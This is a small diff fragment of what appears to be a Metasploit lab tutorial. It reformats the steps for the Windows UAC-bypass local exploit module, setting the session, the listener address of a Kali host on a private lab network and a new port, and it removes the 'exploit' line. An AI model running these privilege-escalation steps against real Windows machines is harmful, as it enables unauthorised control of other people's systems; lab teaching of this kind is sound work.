@@ -145,15 +145,16 @@ set session 1
     
     ip a
   #### Example: 192.168.56.102  (likely same as your original handler)
+   
     2. In the bypassuac module, set both SESSION and LHOST:
-   ```
-    use exploit/windows/local/bypassuac
-
+   
+```
+use exploit/windows/local/bypassuac
 set session 1
 set LHOST 192.168.56.102    # ← YOUR KALI IP, NOT 127.0.0.1
 set LPORT 4445              # ← Use a NEW port to avoid conflict
 ````
-exploit
+
 
 
     
